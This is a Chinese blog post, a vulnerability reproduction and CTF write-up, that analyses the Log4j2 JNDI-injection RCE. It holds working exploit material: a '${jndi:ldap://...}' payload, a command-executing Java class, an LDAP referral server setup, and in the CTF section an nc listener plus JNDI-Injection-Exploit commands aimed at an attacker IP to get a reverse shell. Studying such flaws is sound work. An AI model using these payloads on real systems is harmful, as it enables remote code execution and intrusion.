@@ -1,0 +1,262 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Err0r"><meta name="copyright" content="Err0r"><meta name="generator" content="Hexo 6.3.0"><meta name="theme" content="hexo-theme-yun"><title>Log4j2 RCE漏洞代码浅析 | Err0r</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"err0r.top","root":"/","title":"云游君的小站","version":"1.10.9","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Err0r" type="application/atom+xml"><meta name="description" content="开摸">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2 RCE漏洞代码浅析">
+<meta property="og:url" content="https://err0r.top/article/log4jrce/index.html">
+<meta property="og:site_name" content="Err0r">
+<meta property="og:description" content="开摸">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/4E32FA68A576C51928C018DCF51FA1C9.jpg">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210205230894.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210205154269.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210205406063.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210210755065.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210210848125.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210211207737.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210212715616.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210213200746.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210213243728.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210213339178.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210213713378.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210213738925.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210214044470.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210214104131.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210214154131.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210214359815.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210214639781.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210214738016.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210214846121.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210214939264.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210222546722.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210222738049.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210222850555.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210223114820.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210223755936.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210223337687.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210223411156.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210224236428.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210224502476.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210224916380.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210224949536.png">
+<meta property="og:image" content="https://err0r.top/article/log4jrce/image-20211210225033795.png">
+<meta property="article:published_time" content="2021-12-10T12:15:17.000Z">
+<meta property="article:modified_time" content="2021-12-15T03:02:13.969Z">
+<meta property="article:author" content="Err0r">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://err0r.top/article/log4jrce/4E32FA68A576C51928C018DCF51FA1C9.jpg"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Err0r"><img width="96" loading="lazy" src="/yun.png" alt="Err0r"></a><div class="site-author-name"><a href="/about/">Err0r</a></div><a class="site-name" href="/about/site.html">Err0r</a><sub class="site-subtitle">gyy</sub><div class="site-description">gugugu</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">43</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">11</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%AE%8C%E5%90%8E"><span class="toc-number">1.2.</span> <span class="toc-text">创建完后</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E4%BE%9D%E8%B5%96"><span class="toc-number">1.3.</span> <span class="toc-text">添加依赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%BB%BA%E4%B8%A4%E4%B8%AAclass"><span class="toc-number">1.4.</span> <span class="toc-text">新建两个class</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-number">1.5.</span> <span class="toc-text">编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.6.</span> <span class="toc-text">开启http服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9%E5%87%86%E5%A4%87%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.7.</span> <span class="toc-text">到一个新的文件夹准备服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%8C%85"><span class="toc-number">1.8.</span> <span class="toc-text">打包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.9.</span> <span class="toc-text">上服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x02 流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E9%A2%98%E7%9B%AE"><span class="toc-number">3.</span> <span class="toc-text">0x03 题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%88%E8%B5%B7%E7%9B%91%E5%90%AC"><span class="toc-number">3.1.</span> <span class="toc-text">1.服务器先起监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B5%B7%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.2.</span> <span class="toc-text">2.起服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B9%B2%E5%AE%83"><span class="toc-number">3.3.</span> <span class="toc-text">3.干它</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://err0r.top/article/log4jrce/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Err0r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Err0r"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Log4j2 RCE漏洞代码浅析</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2021-12-10 20:15:17" itemprop="dateCreated datePublished" datetime="2021-12-10T20:15:17+08:00">2021-12-10</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2021-12-15 11:02:13" itemprop="dateModified" datetime="2021-12-15T11:02:13+08:00">2021-12-15</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">漏洞复现</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>开摸</p>
+<span id="more"></span>
+
+<img src="/article/log4jrce/4E32FA68A576C51928C018DCF51FA1C9.jpg" class="" title="4E32FA68A576C51928C018DCF51FA1C9" loading="lazy">
+
+<p>Log4j2是一个基于Java的日志框架，Apache Log4j的重构版本。新增的 Lookups 方法设计用于通过多种途径动态引入外部变量，log4j2版本 &lt; log4j-2.15.0-rc2 可由JNDI注入实现远程代码执行。</p>
+<p>转载请注明本文作者和地址。</p>
+<hr>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>新建maven项目</p>
+<img src="/article/log4jrce/image-20211210205230894.png" class="" title="image-20211210205230894" loading="lazy">
+
+<h3 id="创建完后"><a href="#创建完后" class="headerlink" title="创建完后"></a>创建完后</h3><img src="/article/log4jrce/image-20211210205154269.png" class="" title="image-20211210205154269" loading="lazy">
+
+<h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><pre class="language-none"><code class="language-none">&lt;dependency&gt;
+	&lt;groupId&gt;org.apache.logging.log4j&lt;&#x2F;groupId&gt;
+	&lt;artifactId&gt;log4j-core&lt;&#x2F;artifactId&gt;
+	&lt;version&gt;2.14.1&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;
+&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.apache.logging.log4j&#x2F;log4j-api --&gt;
+&lt;dependency&gt;
+	&lt;groupId&gt;org.apache.logging.log4j&lt;&#x2F;groupId&gt;
+	&lt;artifactId&gt;log4j-api&lt;&#x2F;artifactId&gt;
+	&lt;version&gt;2.14.1&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;</code></pre>
+
+
+
+<img src="/article/log4jrce/image-20211210205406063.png" class="" title="image-20211210205406063" loading="lazy">
+
+<h3 id="新建两个class"><a href="#新建两个class" class="headerlink" title="新建两个class"></a>新建两个class</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
+<span class="token comment">/*
+ *    @Author: Err0r
+ *    @date : 2021/12/10
+ *    @file : log4j
+ */</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> log4j <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>log4j<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"$&#123;jndi:ldap://127.0.0.1:1389/Log4jRCE&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
+<span class="token comment">/*
+ *    @Author: Err0r
+ *    @date : 2021/12/10
+ *    @file : Log4jRCE
+ */</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4jRCE</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">String</span> var0 <span class="token operator">=</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">;</span>
+            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            var1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><img src="/article/log4jrce/image-20211210210755065.png" class="" title="image-20211210210755065" loading="lazy">
+
+<h3 id="开启http服务"><a href="#开启http服务" class="headerlink" title="开启http服务"></a>开启http服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token number">8888</span></code></pre>
+
+<img src="/article/log4jrce/image-20211210210848125.png" class="" title="image-20211210210848125" loading="lazy">
+
+<h3 id="到一个新的文件夹准备服务"><a href="#到一个新的文件夹准备服务" class="headerlink" title="到一个新的文件夹准备服务"></a>到一个新的文件夹准备服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git@github.com:mbechler/marshalsec.git</code></pre>
+
+<h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><pre class="language-bash" data-language="bash"><code class="language-bash">mvn clean package <span class="token parameter variable">-DskipTests</span></code></pre>
+
+<h3 id="上服务"><a href="#上服务" class="headerlink" title="上服务"></a>上服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://127.0.0.1:8888/#Log4jRCE"</span></code></pre>
+
+<img src="/article/log4jrce/image-20211210211207737.png" class="" title="image-20211210211207737" loading="lazy">
+
+<p>运行log4j.java</p>
+<img src="/article/log4jrce/image-20211210212715616.png" class="" title="image-20211210212715616" loading="lazy">
+
+<h2 id="0x02-流程分析"><a href="#0x02-流程分析" class="headerlink" title="0x02 流程分析"></a>0x02 流程分析</h2><p>菜鸡蹩脚调试了半天，不知是否正确，还请大师傅们批评指正。</p>
+<p>首先是一系列初始化操作，然后是我们的poc作为message传入<code>logMessage</code>(AbstractLogger.java)</p>
+<img src="/article/log4jrce/image-20211210213200746.png" class="" title="image-20211210213200746" loading="lazy">
+
+<img src="/article/log4jrce/image-20211210213243728.png" class="" title="image-20211210213243728" loading="lazy">
+
+<p>然后进入<code>logMessageSafely</code></p>
+<img src="/article/log4jrce/image-20211210213339178.png" class="" title="image-20211210213339178" loading="lazy">
+
+<p>接着进入<code>logMessageTrackRecursion</code></p>
+<img src="/article/log4jrce/image-20211210213713378.png" class="" title="image-20211210213713378" loading="lazy">
+
+<p>指向<code>tryLogMessage</code></p>
+<img src="/article/log4jrce/image-20211210213738925.png" class="" title="image-20211210213738925" loading="lazy">
+
+<p>再走到LoggerConfig的<code>log</code></p>
+<img src="/article/log4jrce/image-20211210214044470.png" class="" title="image-20211210214044470" loading="lazy">
+
+<p>由<code>processLogEvent</code>来判定Event</p>
+<img src="/article/log4jrce/image-20211210214104131.png" class="" title="image-20211210214104131" loading="lazy">
+
+<img src="/article/log4jrce/image-20211210214154131.png" class="" title="image-20211210214154131" loading="lazy">
+
+<p>在一系列跟进后发现了个<code>toSerializable</code>，里面用了它的format方法</p>
+<img src="/article/log4jrce/image-20211210214359815.png" class="" title="image-20211210214359815" loading="lazy">
+
+<p>里面会对首尾判断是否满足<code>$&#123;xxx&#125;</code>逻辑</p>
+<blockquote>
+<p>&#x2F;&#x2F; TODO can we optimize this? 很皮啊</p>
+</blockquote>
+<p>然后进入了<code>replace</code>,<code>substitute</code></p>
+<img src="/article/log4jrce/image-20211210214639781.png" class="" title="image-20211210214639781" loading="lazy">
+
+<img src="/article/log4jrce/image-20211210214738016.png" class="" title="image-20211210214738016" loading="lazy">
+
+<p>调用了<code>StrSubtitutor</code>的<code>resolveVariable</code></p>
+<img src="/article/log4jrce/image-20211210214846121.png" class="" title="image-20211210214846121" loading="lazy">
+
+<p>通过resolveVariable调用<code>lookup</code></p>
+<img src="/article/log4jrce/image-20211210214939264.png" class="" title="image-20211210214939264" loading="lazy">
+
+<p>顺便研究一下<code>lookup</code></p>
+<p>这里</p>
+<pre class="language-none"><code class="language-none">prefix &#x3D; &quot;jndi&quot;
+name &#x3D; &quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Log4jRCE&quot;
+lookup &#x3D; &#123;JndiLookup@2064&#125; </code></pre>
+
+<p>这里从<code>strLookupMap</code>的map里提取了jndi的lookup，然后在jndi的lookup方法里成功开花</p>
+<img src="/article/log4jrce/image-20211210222546722.png" class="" title="image-20211210222546722" loading="lazy">
+
+<p><code>return Objects.toString(jndiManager.lookup(jndiName), null)</code></p>
+<p>这里就是<code>jndiManager.lookup(&#39;ldap://127.0.0.1:1389/Log4jRCE&#39;)</code></p>
+<img src="/article/log4jrce/image-20211210222738049.png" class="" title="image-20211210222738049" loading="lazy">
+
+<img src="/article/log4jrce/image-20211210222850555.png" class="" title="image-20211210222850555" loading="lazy">
+
+<pre class="language-none"><code class="language-none">return super.lookup(var1)</code></pre>
+
+<p>也就是<code>super.lookup(&#39;ldap://127.0.0.1:1389/Log4jRCE&#39;)</code></p>
+<img src="/article/log4jrce/image-20211210223114820.png" class="" title="image-20211210223114820" loading="lazy">
+
+<pre class="language-none"><code class="language-none">var1 &#x3D; &quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Log4jRCE&quot;
+var2 (slot_2) &#x3D; &#123;ResolveResult@2676&#125; 
+var3 (slot_3) &#x3D; &#123;LdapCtx@2677&#125; </code></pre>
+
+<p>var2获取remote的class，即跳转到了我们之前编译的<code>Log4jRCE.class</code></p>
+<img src="/article/log4jrce/image-20211210223755936.png" class="" title="image-20211210223755936" loading="lazy">
+
+<p>var3实例化，接着var3lookup，加载</p>
+<img src="/article/log4jrce/image-20211210223337687.png" class="" title="image-20211210223337687" loading="lazy">
+
+<p>然后就不必多说了，直接执行，遍地开花</p>
+<img src="/article/log4jrce/image-20211210223411156.png" class="" title="image-20211210223411156" loading="lazy">
+
+<hr>
+<h2 id="0x03-题目"><a href="#0x03-题目" class="headerlink" title="0x03 题目"></a>0x03 题目</h2><p>在12月10日晚间 <a target="_blank" rel="noopener" href="https://ctf.show/challenges#Log4j%E5%A4%8D%E7%8E%B0-1730">ctfshow</a>也上线了该漏洞的复现，利用思路如上，直接拿编译好的jar文件打</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-A</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-C</span> <span class="token string">"[payload]"</span></code></pre>
+
+<p>记得payload最好base64编码一下，以免出错。</p>
+<p>其实在今年早些时候V&amp;Nctf有道题也是<code>JNDI-Injection-Exploit</code></p>
+<p><a href="https://err0r.top/article/VN2021ctf/?highlight=realezjvav">V&amp;N ctf realezjvav</a></p>
+<blockquote>
+<p>不能说极其相似，只能说一摸一样，今年上半年都有ctf题目了</p>
+<p>一个没被重视的洞，甚至没有CVE编号，终究还是扩大到了堪比永恒之蓝的范围…</p>
+</blockquote>
+<p>我发现我服务器上竟然还有源码，直接打就行了</p>
+<img src="/article/log4jrce/image-20211210224236428.png" class="" title="image-20211210224236428" loading="lazy">
+
+<h3 id="1-服务器先起监听"><a href="#1-服务器先起监听" class="headerlink" title="1.服务器先起监听"></a>1.服务器先起监听</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">1234</span></code></pre>
+
+<img src="/article/log4jrce/image-20211210224502476.png" class="" title="image-20211210224502476" loading="lazy">
+
+<h3 id="2-起服务"><a href="#2-起服务" class="headerlink" title="2.起服务"></a>2.起服务</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-A</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-C</span> <span class="token string">"[payload]"</span></code></pre>
+
+<img src="/article/log4jrce/image-20211210224916380.png" class="" title="image-20211210224916380" loading="lazy">
+
+<h3 id="3-干它"><a href="#3-干它" class="headerlink" title="3.干它"></a>3.干它</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">[</span>ip<span class="token punctuation">]</span><span class="token operator">:</span><span class="token punctuation">[</span>port<span class="token punctuation">]</span><span class="token operator">/</span><span class="token punctuation">[</span>xxxx<span class="token punctuation">]</span>&#125;</span></code></pre>
+
+<img src="/article/log4jrce/image-20211210224949536.png" class="" title="image-20211210224949536" loading="lazy">
+
+<p>直接弹到shell</p>
+<img src="/article/log4jrce/image-20211210225033795.png" class="" title="image-20211210225033795" loading="lazy">
+
+<hr>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/udoless/apache-log4j-rce-poc">https://github.com/udoless/apache-log4j-rce-poc</a></p>
+<p>转载请注明本文作者和地址</p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Err0r</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://err0r.top/article/log4jrce/" title="Log4j2 RCE漏洞代码浅析">https://err0r.top/article/log4jrce/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/article/socket/" rel="prev" title="Socket网络通信编程项目"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Socket网络通信编程项目</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/article/2021xyb/" rel="next" title="2021祥云杯"><span class="post-nav-text">2021祥云杯</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div 